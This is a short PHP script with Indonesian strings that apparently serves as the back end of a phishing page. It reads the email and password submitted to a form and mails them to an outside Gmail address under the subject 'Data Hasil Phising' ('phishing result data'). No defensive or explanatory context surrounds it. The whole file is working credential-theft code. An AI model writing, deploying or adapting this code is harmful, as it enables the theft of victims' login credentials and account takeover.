<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $email = $_POST["email"];
    $pw = $_POST["pw"];

    $tujuan = "omcyber@gmail.com";
    $judul = "Data Hasil Phising";
    $pesan = "Nama: " . $email . "\n"
        . "Email: " . $pw;
    $berhasil = mail($tujuan, $judul, $pesan);

    if ($berhasil) {
        echo "Data berhasil dikirim ke " . $tujuan;
    } else {
        echo "Gagal mengirim data.";
    }
}
?>